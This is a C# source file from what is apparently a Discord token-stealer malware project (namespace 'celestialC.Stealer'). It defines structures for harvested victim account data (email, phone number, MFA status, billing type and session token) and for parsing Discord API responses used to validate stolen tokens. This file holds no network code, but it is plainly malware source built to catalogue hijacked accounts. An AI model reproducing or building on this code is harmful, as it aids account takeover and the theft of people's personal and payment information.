using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer.Messenger.Discord
{
    internal struct DiscordAccountFormat
    {
        internal readonly string Username;
        internal readonly string UserId;
        internal readonly bool Mfa;
        internal readonly string Email;
        internal readonly string PhoneNumber;
        internal readonly bool Verified;
        internal readonly string Nitro;
        internal readonly string[] BillingType;
        internal readonly string Token;

        internal DiscordAccountFormat(string username, string userId, bool mfa, string email, string phoneNumber,
                                      bool verified, string nitro, string[] billingType, string token)
        {
            Username = username;
            UserId = userId;
            Mfa = mfa;
            Email = email;
            PhoneNumber = phoneNumber;
            Verified = verified;
            Nitro = nitro;
            BillingType = billingType;
            Token = token;
        }
    }

    // Classes below are for json deserialization
    internal struct Promotion
    {
        internal string outbound_title { get; set; }
    }

    internal struct TokenResponseJsonFormat
    {
        internal string id { get; set; }
        internal string username { get; set; }
        internal string discriminator { get; set; }
        internal bool mfa_enabled { get; set; }
        internal int premium_type { get; set; }
        internal string email { get; set; }
        internal bool verified { get; set; }
        internal string phone { get; set; }
    }

    internal struct BillingResponseJsonFormat
    {
        internal int type { get; set; }
    }
}
